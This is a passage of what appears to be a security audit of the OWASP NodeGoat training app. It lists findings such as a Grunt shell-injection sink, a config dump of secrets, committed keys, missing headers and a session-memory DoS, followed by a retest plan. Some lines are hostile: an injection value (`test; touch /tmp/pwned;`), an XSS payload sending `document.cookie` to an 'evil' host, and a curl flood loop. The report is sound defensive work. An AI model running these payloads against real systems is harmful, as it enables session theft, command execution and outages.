- So the seeded credentials land in whatever persistent stdout those pipelines keep.
- Impact is limited (low is right) because the same passwords are already published in the repo at `db-reset.js:18-35` and test/e2e/fixtures/users/\*.json; the log just widens who sees them and can outlive a reseed.

</details>

</details>

<details>
<summary><b>YKB-032</b> · 🔵 Low · Environment defaults to development, injecting a livereload script from a fixed non-TLS port into every page</summary>

**Location:** [`config/config.js:5-8`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/config/config.js#L5-L8) · **Category:** misconfiguration · **Status:** Confirmed

**What is wrong**

- `config/config.js:5` defaults `NODE_ENV` to "development" when the variable is unset, and `config/env/development.js:9-13` adds an `environmentalScripts` entry that is a literal `<script>` tag loading `http://<host>:35729/livereload.js`.
- Every template emits that value as raw HTML (`layout.html:125-127`; also `login.html:145-147` and `signup.html:125-127`) with autoescaping off (`server.js:135-142`).

```js
const finalEnv = process.env.NODE_ENV || "development";

const allConf = require(path.resolve(__dirname + "/../config/env/all.js"));
const envConf = require(path.resolve(__dirname + "/../config/env/" + finalEnv.toLowerCase() + ".js")) || {};
```

**Impact**

- **Attacker:** anyone who can serve something on port 35729 of the host (another tenant/process, an open network) or sit in the path.
- **Gain:** script execution in every page of the app, in every user's session, because the page loads JS from a fixed, unencrypted, non-app port; and a deployment that forgets `NODE_ENV` silently ships debug behaviour plus a hardcoded internal key `v9dn0balpqas1pcc281tn5ood1` (`development.js:6`).

**How to trigger it**

- Start the server with no `NODE_ENV` (the documented way, `npm start`), then fetch `/login`: the HTML contains `<script>document.write("<script src='http://localhost:35729/livereload.js'></...")</script>`.
- Anything answering on 35729 controls JS in every page.

**How to fix it**

- Default to production in `config/config.js:5` (or throw when `NODE_ENV` is unset) and only populate `environmentalScripts` from `config/env/development.js`.
- `layout.html:125-127` emits the value unescaped into every page, so anything in that list must be trusted; keep the livereload snippet to local dev only.

Suggested code for `config/config.js`:

```js
const finalEnv = process.env.NODE_ENV || "production";
```

<details>
<summary>How it was verified</summary>

- Reachable and controlled as claimed, with one correction on impact.
- `config/config.js:5` defaults `finalEnv` to "development" when `NODE_ENV` is unset, so `config/env/development.js:9-13` supplies the literal livereload `<script>document.write("<script src='http://" + location.host.split(":")[0] + ":35729/livereload.js'>...")</script>`, which every route passes to its view (`app/routes/profile.js:35`, `app/routes/memos.js:30`, `app/routes/session.js:49` ...) and every layout emits raw at `app/views/layout.html:125-127`, `login.html:145-147`, `signup.html:125-127` and `tutorial/layout.html:95-97` with swig autoescape off (`server.js:135-142`).
- Nothing in the app listens on 35729 and `docker-compose.yml` only publishes 4000, so the port is free for any other process/tenant on the host; whoever answers it gets script execution in every session.
- Trigger holds: `npm start` with `NODE_ENV` unset (`package.json:29`; `docker-compose.yml:7` passes it through unset) and `GET /login` returns the tag.
- **Correction:** 'non-TLS' adds nothing because the whole app is plain HTTP already (`server.js:145`; HTTPS server commented out at `server.js:149-155`).
- Stays low: it needs another writer on the host - a debug default leaking into prod.

</details>

</details>

<details>
<summary><b>YKB-033</b> · 🔵 Low · Full configuration including secrets is dumped to stdout on every startup</summary>

**Location:** [`config/config.js:11-13`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/config/config.js#L11-L13) · **Category:** sensitive-data · **Status:** Confirmed

**What is wrong**

- `config/config.js:12-13` prints the merged configuration to stdout with `util.inspect(config, false, null)`.
- The config contains `cookieSecret`, `cryptoKey` and the ZAP API key (`config/env/all.js:8-10`, `config/env/development.js:6`).
- Container logs (docker logs, Heroku, forever logs per `Procfile:1`) persist this.

```js

console.log(`Current Config:`);
console.log(util.inspect(config, false, null));
```

**Impact**

- **Attacker:** someone who can read application logs.
- **Gain:** the session signing secret and crypto key, plus the Mongo URI and environment layout.

**How to trigger it**

Start the server and read the first lines of its output: `Current Config:` followed by the object with `cookieSecret`, `cryptoKey`, `zapApiKey` and db in clear text.

**How to fix it**

Remove the dump or log only non-secret fields, e.g. `{ port: config.port, env: finalEnv }`. `cryptoKey` is currently unused (the AES helper at `app/data/profile-dao.js:15-40` is commented out) but is still a secret that should not be printed.

Suggested code for `config/config.js`:

```js
console.log(`Starting NodeGoat in ${finalEnv} on port ${config.port}`);
```

<details>
<summary>How it was verified</summary>

- `config/config.js:11-13` runs `console.log(util.inspect(config, false, null))` unconditionally at module load (config is required by every route, e.g. `app/routes/memos.js:4`), and the merged object holds `cookieSecret` (`config/env/all.js:8`), `cryptoKey` (`config/env/all.js:9`), db/`MONGODB_URI` (`config/env/all.js:3`) and, in dev/test, `zapApiKey` (`config/env/development.js:6`, `test.js:6`). util.inspect depth null means no truncation.
- `cookieSecret` is the express-session signing key (`server.js:82`), so log access implies the ability to forge session cookies.
- Runs on every startup, including under `Procfile:1` (forever -m 5) and docker logs.
- Low because it needs log read access, but the defect is plainly there.

</details>

</details>

<details>
<summary><b>YKB-034</b> · 🔵 Low · Crypto key, TLS private key and ZAP API key are committed to the repository</summary>

**Location:** [`config/env/all.js:8-10`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/config/env/all.js#L8-L10) · **Category:** secrets · **Status:** Confirmed

**What is wrong**

Three secret values are committed:

- `cryptoKey` `a_secure_key_for_crypto_here` (`config/env/all.js:9`), used by the AES helper for SSN/DOB encryption (`profile-dao.js:15-39`). A fixed, published key makes any encrypted field decryptable by anyone who obtains the database.
- A TLS private key with its certificate at `artifacts/cert/server.key` / `server.crt`, which the commented HTTPS server loads (`server.js:18-26`) and which is baked into the Docker image (`Dockerfile:13`).
- A ZAP API key `v9dn0balpqas1pcc281tn5ood1` in `config/env/development.js:6` and `config/env/test.js:6`.

```js
    cookieSecret: "session_cookie_secret_key_here",
    cryptoKey: "a_secure_key_for_crypto_here",
    cryptoAlgo: "aes256",
```

**Impact**

- **Attacker:** anyone who can read the repository or the Docker image.
- **Gain:** decryption of stored SSN/DOB (once the crypto fix is enabled), server impersonation/TLS interception, control of the ZAP instance.

**How to trigger it**

`artifacts/cert/server.key` starts with -----BEGIN RSA PRIVATE KEY-----; `config/env/all.js:9` and `config/env/development.js:6` contain the other values verbatim.

**How to fix it**

- Read secrets from env at `config/env/all.js:8-9` (`process.env.COOKIE_SECRET`, `process.env.CRYPTO_KEY`) and fail fast when unset; remove the committed `zapApiKey` (`config/env/development.js:6`, `test.js:6`); generate the TLS keypair per deployment or terminate TLS at the proxy, and keep artifacts/cert out of repo and image.
- If the crypto fix at `app/data/profile-dao.js:15-40` is re-enabled, note `cryptoAlgo` is "aes256" but the key is not 32 bytes and the IV is stashed on shared config (`profile-dao.js:31-38`), so use a per-record random IV and derive a real 32-byte key.

Suggested code for `config/env/all.js`:

```js
cookieSecret: process.env.COOKIE_SECRET,
cryptoKey: process.env.CRYPTO_KEY,
cryptoAlgo: "aes256",
```

<details>
<summary>How it was verified</summary>

- All three values are committed in a public repo: `cryptoKey` and `cookieSecret` at `config/env/all.js:8-9`, the RSA private key at `artifacts/cert/server.key` (starts -----BEGIN RSA PRIVATE KEY-----) with `server.crt`, and `zapApiKey` at `config/env/development.js:6` and `test.js:6`.
- The keypair is baked into the image: .dockerignore does not exclude artifacts/cert and `Dockerfile:13` copies the whole tree.
- Severity is overstated as high, though.
- The AES helper that would use `cryptoKey` is commented out (`app/data/profile-dao.js:15-40`), so SSN/DOB are stored in clear text today and no ciphertext depends on that key; the HTTPS server that loads the keypair is also commented out (`server.js:18-28`, 149-155), so it is a demo localhost pair with negligible impersonation value.
- Missing hardening / leak with little direct impact = low.

</details>

</details>

<details>
<summary><b>YKB-035</b> · 🔵 Low · Container runs an end-of-life Node.js and installs dependencies without the lockfile</summary>

**Location:** [`Dockerfile:1-7`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/Dockerfile#L1-L7) · **Category:** dependency · **Status:** Confirmed

**What is wrong**

- The runtime image is Node 12, end-of-life and no longer receiving security patches (with the abandoned swig and old marked 0.3.5 on top of it).
- The build stage also runs `npm install` rather than `npm ci`, so `package-lock.json` is not enforced and resolved dependencies can drift between builds - a supply-chain foothold for the app server.

```text
FROM node:12-alpine
ENV WORKDIR /usr/src/app/
WORKDIR $WORKDIR
COPY package*.json $WORKDIR
RUN npm install --production --no-cache

FROM node:12-alpine
```

**How to trigger it**

`Dockerfile:1` and `:7` are `FROM node:12-alpine`; `Dockerfile:5` is `RUN npm install --production --no-cache`. Node 12 reached end-of-life on 2022-04-30.

**How to fix it**

Use a supported base image on both FROM lines (e.g. `node:20`-alpine) and `RUN npm ci --omit=dev` so `package-lock.json` is authoritative. Also consider that `Dockerfile:13` COPYs the whole tree, including `artifacts/cert/server.key` (see YKB-034).

Suggested code for `Dockerfile`:

```text
FROM node:20-alpine AS build
WORKDIR /usr/src/app/
COPY package*.json ./
RUN npm ci --omit=dev

FROM node:20-alpine
USER node
```

<details>
<summary>How it was verified</summary>

- `Dockerfile:1` and `:7` are `FROM node:12-alpine` (Node 12 EOL 2022-04-30) and `Dockerfile:5` is `RUN npm install --production --no-cache`, so `^` ranges in `package.json` (express, helmet, forever, mongodb, swig, underscore) are re-resolved at build time instead of the lockfile being enforced.
- `package-lock.json` is present in the repo but `Dockerfile` only copies package\*.json and never runs npm ci.
- Missing hardening / defence in depth with no directly triggerable flaw, so low is right.

</details>

</details>

<details>
<summary><b>YKB-036</b> · 🔵 Low · Grunt db-reset task interpolates an environment value into a shell command</summary>

**Location:** [`Gruntfile.js:158-176`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/Gruntfile.js#L158-L176) · **Category:** injection · **Status:** Confirmed

**What is wrong**

- The db-reset Grunt task builds a shell command by string concatenation and runs it through `child_process.exec`, with the environment/argument value interpolated unquoted: `var cmd = ... "NODE_ENV=" + finalEnv + " "` then `exec(cmd + "node artifacts/db-reset.js")` (`Gruntfile.js:158-167`).
- `finalEnv` comes from `process.env`.`NODE_ENV` or the task argument.

Low because it needs control of tooling input, but it is a genuine command-injection sink.

```js
    grunt.registerTask("db-reset", "(Re)init the database.", function(arg) {
        var finalEnv = process.env.NODE_ENV || arg || "development";
        var done;

        done = this.async();
        var cmd = process.platform === "win32" ? "NODE_ENV=" + finalEnv + " & " : "NODE_ENV=" + finalEnv + " ";

        exec(
            cmd + "node artifacts/db-reset.js",
            function(err, stdout, stderr) {
                if (err) {
                    grunt.log.error("db-reset:");
                    grunt.log.error(err);
                    grunt.log.error(stderr);
                } else {
                    grunt.log.ok(stdout);
                }
                done();
            }
```

**Impact**

- **Attacker:** anyone who can influence `NODE_ENV` or run `grunt db-reset:<arg>` in CI or on a build machine (a PR that changes a script, a CI variable, or the deploy pipeline that runs `npm run db:seed`).
- **Gain:** arbitrary shell command execution in the build/deploy context.

**How to trigger it**

`NODE_ENV='test; touch /tmp/pwned;' grunt db-reset` (or `grunt db-reset:test;id`) executes the extra commands through the shell spawned by `exec()`.

**How to fix it**

Drop the shell: use `execFile` with an argv array and pass `NODE_ENV` through the env option, as in `fixCode`.

Suggested code for `Gruntfile.js`:

```js
const execFile = require("child_process").execFile;

grunt.registerTask("db-reset", "(Re)init the database.", function(arg) {
    const done = this.async();
    const finalEnv = process.env.NODE_ENV || arg || "development";
    execFile(process.execPath, ["artifacts/db-reset.js"],
        { env: Object.assign({}, process.env, { NODE_ENV: finalEnv }) },
        function(err, stdout, stderr) {
            if (err) {
                grunt.log.error(err);
                grunt.log.error(stderr);
            } else {
                grunt.log.ok(stdout);
            }
            done();
        });
});
```

<details>
<summary>How it was verified</summary>

- Real shell sink: `Gruntfile.js:159` builds `process.env.NODE_ENV || arg || "development"` and `Gruntfile.js:163` concatenates it unquoted into `NODE_ENV=<value> `, then `Gruntfile.js:165-166` passes it to `child_process.exec` (via `/bin/sh`).
- `NODE_ENV='test; touch /tmp/pwned;' grunt db-reset` yields `NODE_ENV=test; touch /tmp/pwned; node artifacts/db-reset.js`, and the bare `NODE_ENV=test` prefix exits 0 so the injected command runs.
- Low is right, though the trust boundary is thin: the only inputs are the environment of the grunt process and the task argument, both supplied by whoever invokes the tool, and the shipped path `npm run db:seed` (`package.json:34`) sets a constant `NODE_ENV=test` via cross-env, so it is not reachable from the web app.
- A CI job that forwards a variable-controlled `NODE_ENV` is the realistic case.

</details>

</details>

<details>
<summary><b>YKB-037</b> · 🔵 Low · Security headers disabled and the app is only served over plain HTTP</summary>

**Location:** [`server.js:38-65`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/server.js#L38-L65) · **Category:** misconfiguration · **Status:** Confirmed

**What is wrong**

- All hardening middleware is commented out in `server.js:38-65`: `app.disable("x-powered-by")`, `helmet.frameguard` (no `X-Frame-Options` -&gt; clickjacking), `helmet.noCache`, `contentSecurityPolicy`, hsts and dont-sniff-mimetype are all disabled; only the favicon middleware is active.
- Independently the app is served by `http.createServer` on plain HTTP (`server.js:144-147`) while the HTTPS block is commented out (`server.js:149-155`), and the session cookie has no Secure flag, so credentials, SSN and bank details cross the network in clear text.

```js
    /*
    // Fix for A5 - Security MisConfig
    // TODO: Review the rest of helmet options, like "xssFilter"
    // Remove default x-powered-by response header
    app.disable("x-powered-by");

    // Prevent opening page in frame or iframe to protect from clickjacking
    app.use(helmet.frameguard()); //xframe deprecated

    // Prevents browser from caching and storing page
    app.use(helmet.noCache());

    // Allow loading resources only from white-listed domains
    app.use(helmet.contentSecurityPolicy()); //csp deprecated

    // Allow communication only on HTTPS
    app.use(helmet.hsts());

    // TODO: Add another vuln: https://github.com/helmetjs/helmet/issues/26
    // Enable XSS filter in IE (On by default)
    // app.use(helmet.iexss());
    // Now it should be used in hit way, but the README alerts that could be
    // dangerous, like specified in the issue.
    // app.use(helmet.xssFilter({ setOnOldIE: true }));

    // Forces browser to only use the Content-Type set in the response header instead of sniffing or guessing it
    app.use(nosniff());
    */
```

**Impact**

- **Attacker:** a network-position attacker (passive sniffing/session capture), any site framing the app to capture clicks on `/profile` or `/benefits` (which submit SSN and bank data), MIME-sniffing attacks.
- **Gain:** session/credential theft, clickjacking of sensitive forms, weakened browser-side XSS defences.

**How to trigger it**

`curl -i http://localhost:4000/login` shows `X-Powered-By: Express` and no `X-Frame-Options`, HSTS, CSP, `X-Content-Type-Options` or Cache-Control header, over http.

**How to fix it**

As reported: uncomment the hardening block (`server.js:38-65`), serve TLS via the commented `https.createServer` block (`server.js:149-155`) and set `cookie.secure` in the session config (`server.js:92-100`).

<details>
<summary>How it was verified</summary>

- Verified `server.js`: the entire helmet/nosniff/`x-powered-by` block is inside one comment (lines 38-65) and only the favicon middleware runs (line 67); the app is served by `http.createServer` (`server.js:144-147`) while the `https.createServer` block is commented out (149-155).
- No other middleware sets security headers anywhere (grep for helmet/nosniff shows only commented requires at lines 9/13/14).
- So `X-Powered-By`, HSTS, CSP, `X-Frame-Options`, `X-Content-Type-Options` and Cache-Control are all absent and everything (login credentials, SSN/bank fields) travels over plain HTTP.
- Low is the right severity for this training app.

</details>

</details>

<details>
<summary><b>YKB-038</b> · 🔵 Low · A new server-side session is created for every anonymous request and never expires</summary>

**Location:** [`server.js:78-102`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/server.js#L78-L102) · **Category:** dos · **Status:** Confirmed

**What is wrong**

- The session middleware uses the express-session default MemoryStore (no `store` option, `server.js:78-102`) together with `saveUninitialized: true` (`server.js:84`) and no cookie `maxAge` (`server.js:92-100`).
- Every anonymous request that does not carry a cookie is given a new session object that is kept in the process heap until it is used and the cookie is gone; nothing prunes it.

```js
    app.use(session({
        // genid: (req) => {
        //    return genuuid() // use UUIDs for session IDs
        //},
        secret: cookieSecret,
        // Both mandatory in Express v4
        saveUninitialized: true,
        resave: true
        /*
        // Fix for A5 - Security MisConfig
        // Use generic cookie name
        key: "sessionId",
        */

        /*
        // Fix for A3 - XSS
        // TODO: Add "maxAge"
        cookie: {
            httpOnly: true
            // Remember to start an HTTPS server to get this working
            // secure: true
        }
        */

    }));
```

**Impact**

- **Attacker:** an anonymous visitor with no account.
- **Gain:** send unauthenticated requests without keeping cookies (e.g. `curl` in a loop) and each one adds a session to memory - a cheap, unauthenticated memory-exhaustion/DoS on the single process, and the sessions never idle out.

**How to trigger it**

```js
for i in $(seq 1 100000); do curl -s -o /dev/null http://localhost:4000/login; done - process RSS grows with each request because each response sets a fresh connect.sid and stores a session for it.
```

**How to fix it**

As reported: `saveUninitialized: false`, a cookie `maxAge` (and/or store ttl), and a real store such as connect-mongo that expires entries.

Suggested code for `server.js`:

```js
app.use(session({
    secret: cookieSecret,
    saveUninitialized: false,
    resave: false,
    cookie: { maxAge: 30 * 60 * 1000 }
}));
```

<details>
<summary>How it was verified</summary>

- Verified `server.js:78-102`: no store option (express-session ^1.13.0 per `package.json` -&gt; default MemoryStore), `saveUninitialized: true` (line 84) and the cookie block with any `maxAge` commented out (92-100). express-session's MemoryStore stores sessions in a plain object with no TTL/reaper unless `cookie.maxAge` is set, and `saveUninitialized:true` persists a session object and `Set-Cookie` for every request without a valid session cookie.
- So anonymous curl loops accumulate sessions in process memory indefinitely - a real, cheap unauthenticated memory DoS.
- Low is appropriate.

</details>

</details>

<details>
<summary><b>YKB-039</b> · 🔵 Low · Profile website is HTML-encoded but used as a URL, so javascript: URLs survive into an href <i>(lead)</i></summary>

**Location:** [`app/routes/profile.js:28-31`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/profile.js#L28-L31) · **Category:** xss · **Status:** Lead: the verifier could not demonstrate it

**What is wrong**

- On the profile page the user-supplied `website` goes through `ESAPI.encodeForHTML`, which does nothing to `javascript:` (no HTML metacharacters appear), and the result is placed in an `href`.
- A user who saves `javascript:fetch('//evil/?'+document.cookie)` in their website field gets script execution on the profile page.
- The same template puts the raw submitted `firstName` into `href="{{firstNameSafeString}}"` (`app/views/profile.html:78`), so a `javascript:` value there also executes.

```js
            doc.website = ESAPI.encoder().encodeForHTML(doc.website);
            // fix it by replacing the above with another template variable that is used for 
            // the context of a URL in a link header
            // doc.website = ESAPI.encoder().encodeForURL(doc.website)
```

**How to trigger it**

- `POST /profile` with website=`javascript:alert(document.domain)` and any valid `bankRouting` (e.g. 0198212#); `GET /profile` returns `<input ... value="javascript:alert(document.domain)">` -&gt; the browser treats the value as a URL in the mean place.
- With the link at `app/views/profile.html:78`, submit `firstName`=`javascript:alert(1)` with a failing `bankRouting` to get the page with `<a href="javascript:alert(1)">`.

**How to fix it**

- Fix the context, not just the encoding: build a separate URL-safe field and validate the scheme.
- In `displayProfile` keep `encodeForHTMLAttribute` for value attributes, and for the link either drop it or validate: if (!/^https?:\/\//.`test(doc.website)`) `doc.website` = "https://"; also stop writing raw `firstName` into a href at `app/views/profile.html:78`; pass a `firstNameSafeURLString` that is `encodeURIComponent`'d, and set `autoescape: true` in `server.js:135-142`.

Suggested code for `app/routes/profile.js`:

```js
// profile.js
doc.website = ESAPI.encoder().encodeForHTMLAttribute(doc.website);
doc.firstNameSafeString = ESAPI.encoder().encodeForHTMLAttribute(doc.firstName);

// profile.html:78; use a validated, encoded URL, or a search link
<a href="/search?q={{firstNameSafeURLString}}">Google search this profile by name</a>
```

<details>
<summary>How it was verified</summary>

- Premise is wrong for the named field: `doc.website` is encoded at `app/routes/profile.js:28` and used only inside an input value attribute (`app/views/profile.html:70`), never in an href; `grep website app/views` shows no link use.
- So the cited website-&gt;href javascript: defect does not exist, and even if it did, the value would need user action as it is the victim's own profile field.
- The secondary claim does hold: `handleProfileUpdate` sets `firstNameSafeString` = `firstName` raw (`profile.js:64`), `app/views/profile.html:78` puts it in `<a href="{{firstNameSafeString}}">`, and autoescape is off (`server.js:137`), so `firstName=javascript:alert`(1) with a failing `bankRouting` renders a javascript: href.
- Impact is self-XSS on the validation-failure re-render only (`displayProfile` renders `doc`, which has no `firstNameSafeString`, so the href is empty on the normal GET).
- Cannot establish attacker gain, so plausible rather than confirmed, low.

</details>

</details>

<details>
<summary><b>YKB-040</b> · 🔵 Low · Config-supplied script tags are injected raw into every page <i>(lead)</i></summary>

**Location:** [`app/views/layout.html:125-127`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/views/layout.html#L125-L127) · **Category:** misconfiguration · **Status:** Lead: the verifier could not demonstrate it

**What is wrong**

- `environmentalScripts` is a config array that every page (`layout.html`, `login.html`, `signup.html`) renders as raw HTML with autoescaping off.
- In development it injects an inline `<script>` built with `document.write`, which with no CSP means any influence over configuration (env var, edited env file, or a future dynamic value) becomes script execution on every page, and the inline script defeats a strict CSP.

```html
    {% for script in environmentalScripts %}
    {{script}}
    {% endfor %}
```

**How to trigger it**

- `config/env/development.js:9-13` defines the livereload `<script>document.write(...)</script>`; `app/views/layout.html:125-127` loops over it as `{{script}}` (raw, because autoescape is off in `server.js:135-141`).
- Running with `NODE_ENV` unset (the default at `config/config.js:5`) injects it on every page.

**How to fix it**

Keep the sink but make the trust explicit: turn autoescape on at `server.js:135-142` and mark only this value raw (`{% for script in environmentalScripts %}{{ script|safe }}{% endfor %}`), or serve livereload as a static asset and add a CSP (`helmet.contentSecurityPolicy`, commented at `server.js:68`) whose script-src allows the static host instead of an inline `document.write` script.

Suggested code for `app/views/layout.html`:

```html
{% for script in environmentalScripts %}
{{ script | safe }}
{% endfor %}
<!-- with autoescape enabled elsewhere, and CSP allowing the livereload origin explicitly -->
```

<details>
<summary>How it was verified</summary>

- Reachable and raw, but not attacker-controlled.
- `layout.html:125-126` loops `{% for script in environmentalScripts %}{{script}}` and swig autoescape is off (`server.js:135-142`), and the value is not request-derived: it is read from config at `app/routes/session.js:3-5` and `config/env/development.js:9-13` (`all.js` supplies an empty array, `production.js` supplies nothing).
- Under the default `NODE_ENV=development` (`config/config.js:5`) the dev array is injected on every page, exactly as the claim says.
- But nothing in the code derives `environmentalScripts` from a request, query, DB row or user-editable file; only config/env/\*.js, i.e. the operator.
- So the exploit needs config influence (or a future code change), which the finding itself hedges.
- Real hardening gap (raw HTML sink, inline script, no CSP anywhere: helmet is commented out at `server.js:44-76`), no demonstrable attacker gain =&gt; plausible, low.

</details>

</details>

<details>
<summary><b>YKB-041</b> · 🔵 Low · TLS private key is committed to the repository <i>(lead)</i></summary>

**Location:** [`artifacts/cert/server.key:1-15`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/artifacts/cert/server.key#L1-L15) · **Category:** secrets · **Status:** Lead: the verifier could not demonstrate it

**What is wrong**

- `artifacts/cert/server.key` is a real RSA private key committed to the repository together with its certificate.
- Any clone, fork, CI artifact or container image carries the key, so TLS using this pair can be passively decrypted/impersonated by anyone who has seen the repo - the "HTTPS" fix the app documents would be worthless.

```text
-----BEGIN RSA PRIVATE KEY-----
[key material redacted in this sample]
```

**How to trigger it**

`head -1 artifacts/cert/server.key` shows -----BEGIN RSA PRIVATE KEY----- and the file is 887 bytes of base64 key material; `artifacts/cert/server.crt` is the matching public certificate.

**How to fix it**

- Don't ship a fixture key in the build path: keep artifacts/cert/ out of version control (generator script or .gitignore), and if the HTTPS fix at `server.js:149-155` is ever enabled, read key/cert from env or a mounted secret path and issue a fresh certificate.
- Info severity if no real deployment is meant to use it.

Suggested code for `artifacts/cert/server.key`:

```text
# generate at deploy time instead of committing
openssl req -x509 -newkey rsa:2048 -nodes -keyout /run/secrets/server.key -out /run/secrets/server.crt -days 365
```

<details>
<summary>How it was verified</summary>

- The file really is an RSA private key committed with its certificate (`artifacts/cert/server.key`, 891 bytes, BEGIN RSA PRIVATE KEY; `artifacts/cert/server.crt` is the pair).
- But reachability is not established: the only consumer is the HTTPS server, and that whole block is commented out (`server.js:20-28` defines `httpsOptions`, `server.js:149-155` the `https.createServer`); the app runs plain HTTP at `server.js:144-147`.
- The cert is also a self-signed demo cert (subject `C=AU`, `ST=Some-State`, `O=Internet` Widgits Pty Ltd) that expired 2016-04-24 per openssl.
- So no deployment serves TLS with this pair; impact is a hygiene issue (anyone with the repo could impersonate HTTPS if the commented block were enabled, and 'passive decryption' also needs captured traffic).
- Plausible on impact, low.

</details>

</details>

### Retest plan

<details>
<summary>20 checks to run once the fixes are in</summary>

1. **Re-check: Payroll contribution form runs the posted values through `eval()`, so a logged-in user can execute server-side JavaScript**  
   Confirm the change at `app/routes/contributions.js:28-34` is in place: Replace `eval()` with strict numeric parsing and bounds checking (staying inside the documented 0-30% total): const `toPct` = (v) =&gt; { const s = `String(v).trim()`; if (!/^\d{1,2}\$/.test(s)) return NaN; return Number(s); }; const `preTax` = `toPct(req.body.preTax)`; const `afterTax` = `toPct(req.body.afterTax)`; const roth = `toPct(req.body.roth)`; // then the existing `isNaN`/&lt;0 checks, plus reject anything that is not a finite integer before use.
2. **Re-check: Allocations stock threshold is interpolated into a MongoDB `$where` JavaScript expression**  
   Confirm the change at `app/data/allocations-dao.js:57-86` is in place: Use the already-written fix, or better avoid `$where` entirely: parse and range-check the threshold then query natively, e.g. const `parsedThreshold` = `Number.parseInt`(threshold, 10); if (`Number.isNaN(parsedThreshold)` || `parsedThreshold` &lt; 0 || `parsedThreshold` &gt; 99) return callback(new Error('invalid threshold'), null); return { `userId`: `parsedUserId`, `stocks: { $gt: parsedThreshold }` };
3. **Re-check: Passwords are stored and compared in plain text**  
   Confirm the change at `app/data/user-dao.js:17-66` is in place: Hash on write and compare with `bcrypt.compareSync`(`fromUser`, `fromDB`) (note the commented fix has the arguments reversed), i.e. in `addUser`: password: `bcrypt.hashSync`(password, `bcrypt.genSaltSync()`), and reseed so the demo users' stored hashes match.
4. **Re-check: Allocations page reads the employee id from the URL instead of the session, exposing any user's asset allocation**  
   Confirm the change at `app/routes/allocations.js:11-30` is in place: Take the id from the session and ignore the path parameter: const { `userId` } = `req.session`; (replacing `allocations.js:16-18`). If an admin needs to view arbitrary employees, expose that behind the existing `isAdmin` middleware (`app/routes/index.js:58-59`) with an explicit authorization check.
5. **Re-check: Benefits pages are wired without the admin role check, letting any user list every employee and change their benefits date**  
   Confirm the change at `app/routes/index.js:55-60` is in place: Un-comment the admin middleware on both routes as reported, and validate the target id in `benefits.js` before the DAO call rather than trusting `parseInt`: const id = Number(userId); if (!`Number.isInteger(id)` || id &lt;= 0) { /\* reject, re-render with error \*/ } Also drop the fake `user: { isAdmin: true }` from `benefits.js`:21-23/44-46 and render the caller's real role from the session, so the nav/menu does not lie about privileges.
6. **Re-check: Stock research page fetches any URL supplied in the query string and echoes the response, allowing server-side request forgery**  
   Confirm the change at `app/routes/research.js:12-29` is in place: Keep the base URL server-side and only take the symbol from the client. E.g. in `app/routes/research.js:15` replace the client-supplied base with a constant, validate `symbol` with /^\[A-Z.\]{1,10}\$/, and pass needle options `{ follow: 0, timeout: 5000, rejectUnauthorized: true }`. Do not accept `url` from the query string even though the form ships it (`app/views/research.html:17`).
7. **Re-check: Memos are stored as Markdown and rendered as raw HTML, giving stored XSS to every visitor of the memos page**  
   Confirm the change at `app/views/memos.html:28-34` is in place: Enable autoescape at `server.js:135-142` and keep the memos sink raw on purpose with `| safe`, but render through a maintained sanitizer instead of marked 0.3.5's `sanitize` flag (upgrade marked or run marked's output through sanitize-html/DOMPurify, allow-list href schemes http/https/mailto and escape URLs). Optionally scope memos per author.
8. **Re-check: Default admin and user accounts with published passwords are seeded into every deployment**  
   Confirm the change at `artifacts/db-reset.js:12-37` is in place: Seed hashed passwords and a per-deployment admin secret. bcrypt is already a dependency and the code exists commented out: hashing at `app/data/user-dao.js:26-30` and the matching `compareSync` at `user-dao.js:60-66` (leaving the cleartext `===` compare at `:61` in place is what makes the published password work). Read the admin password from an env var at `artifacts/db-reset.js` and force a change on first login; keep demo accounts to the dev/test seed path.
9. **Re-check: Template autoescaping is switched off for the whole app, so stored profile and benefits data renders as raw HTML**  
   Confirm the change at `server.js:135-142` is in place: As reported: set `autoescape: true` in `server.js:135-142`. If any template genuinely needs raw HTML (e.g. marked-rendered memos), use swig's |safe filter explicitly there rather than disabling escaping globally; also drop the manual ESAPI `encodeForHTML` at `app/routes/profile.js:29-33`, since with autoescape on it would double-encode.
10. **Re-check: SSN, date of birth and bank account details are stored in the database unencrypted**  
   Confirm the change at `app/data/profile-dao.js:42-92` is in place: Encrypt ssn/dob/`bankAcc`/`bankRouting` at rest with an authenticated mode (AES-256-GCM with a per-record random IV stored alongside the ciphertext, key from a secret store), and restrict the MongoDB deployment to authenticated, access-controlled clients; the commented helper in `profile-dao.js:15-40` uses an unauthenticated cipher and a per-process IV, so it needs rework, not just uncommenting.
11. **Re-check: JSON body values are used directly as MongoDB query operators during login and signup**  
   Confirm the change at `app/data/user-dao.js:91-106` is in place: Type-check before querying, e.g. in `validateLogin` and `getUserByUserName`: if (typeof `userName` `!==` 'string' || typeof password `!==` 'string') return callback(`noSuchUserError`, null); or validate the whole body with a schema. Do the same check in `handleSignup` (`app/routes/session.js:189-208`) before calling `getUserByUserName`/`addUser`.
12. **Re-check: No CSRF tokens on any state-changing form**  
   Confirm the change at `app/routes/index.js:44-56` is in place: Mount csurf before the route table (after session, `server.js:102`) rather than after routes; set `sameSite: "lax"` (or "strict") in the session cookie options at `server.js:78-102`; and render the real token. csurf also needs the token in the body for form POSTs, so add the hidden field back to every form: `contributions.html:92` (un-comment), `benefits.html:54`, `memos.html`, logout link -&gt; use `POST /logout`.
13. **Re-check: Learning Resources link redirects to any URL supplied in the query string**  
